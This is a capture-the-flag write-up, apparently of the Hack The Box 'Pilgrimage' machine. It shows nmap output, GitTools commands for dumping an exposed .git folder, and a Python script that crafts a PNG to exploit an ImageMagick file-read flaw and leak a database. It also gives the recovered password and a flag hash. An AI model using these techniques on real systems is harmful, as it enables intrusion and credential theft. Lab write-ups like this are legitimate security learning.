#fileupload #privesc #imagepollution #binwalk
This is the website:
![[Pasted image 20230625231753.png]]

looks like some kind of compressor and with file upload functionality
potential of:
* LFI
* RFI

### Nmap:
```
# Nmap 7.94 scan initiated Sun Jun 25 23:19:35 2023 as: nmap -Pn -A -sV -o nmap_res 10.10.11.219
Nmap scan report for pilgrimage.htb (10.10.11.219)
Host is up (0.39s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    nginx 1.18.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Pilgrimage - Shrink Your Images
| http-git: 
|   10.10.11.219:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...
|_http-server-header: nginx/1.18.0
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
```

***
### PORT 80
nmap found the .git folder , let's try to get the config file from there:
this article very brilliantly describes what are the impact of exposed .git folder:
`https://medium.com/smallcase-engineering/web-security-exposed-git-folder-in-production-51ad9484dee0`


let's save it for later...

we login inside and test our functionality and we see that the images are being loaded as this:
![[Pasted image 20230625234515.png]]
![[Pasted image 20230625234559.png]]


While looking at the .git folder :
do you know that we can dump the whole directory and even much more if this .git folder is exposed:
How:

Once identify the exposed .git repository, the next step is to extract .git folder manually or use tools, for example, dumper.sh in [GitTools](https://github.com/internetwache/GitTools) repository to automate the process. The command line is like:

```
bash gitdumper.sh [http://target/.git/ (http://target/.git/) <dest-dir>
```

we can then recover the files :
To start with, you can recover the source code using extractor.sh in [GitTools](https://github.com/internetwache/GitTools).
```
$ extractor.sh <location-git-folder> <dest-dir>
```

and thus we get this:
the whole code dumped for the website:
![[Pasted image 20230628000717.png]]

while looking at the commit-meta.txt:
![[Pasted image 20230628000842.png]]
The catch lies in the *magick* binary :
when we google the binary with the version given we see not 1 ,2 ,3 but 5 vulnerabilities all listed high giving away the info line file-read, file-delete, file-move , RCE , ssrf for more info:

we also have been given the source code giving away the location of the db we can dump:
in the `index.php` there lies the filename:
*/var/db/pilgrimage* we can use the binary's vulnerability to generate an image that contains the information stored in it from this file in the hex format, yes this may sound a bit sci-fi but this is the actual vulnerability:

first we need to create our image that contains the instructions , when the binary processes that instruction , the code is executed and that data fetched by the code is also stored inside the newly created image by the magick:


we create our 'payload' image via python:
```
import png
from PIL import Image, PngImagePlugin
info = PngImagePlugin.PngInfo()
info.add_text("profile", '/var/db/pilgrimage')
im = Image.open("gradient.png")
im.save(args.output, "PNG", pnginfo=info)
```

we then upload the file and get the file in return created by the binary containing our information

run the command:
```
identify -verbose <the image name>.png
```
at last you will find the text like:
***
20480  
53514c69746520666f726d617420330010000101004020200000003c0000000500000000  
000000000000000400000004000000000000000000000001000000000000000000000000  
00000000000000000000000000000000000000000000003c002e4b910d0ff800040eba00  
0f650fcd0eba0f38000000000000000000000000000000000000000
***
copy this till the end and paste it in the cyberchef [[https://gchq.github.io/CyberChef/]]
select the option -> `from hex` and set it to `auto`
scroll a bit you'll get the id-password
![[Pasted image 20230630170912.png]]
`abigchonkyboi123`
***
### PORT 22
We can ssh into the machine
Now priv-esc 101 
![[Pasted image 20230630234815.png]]


![[Pasted image 20230630234843.png]]


![[Pasted image 20230630235544.png]]


![[Pasted image 20230630235528.png]]


7fe0bba94e4766c0f000c15eac4a720b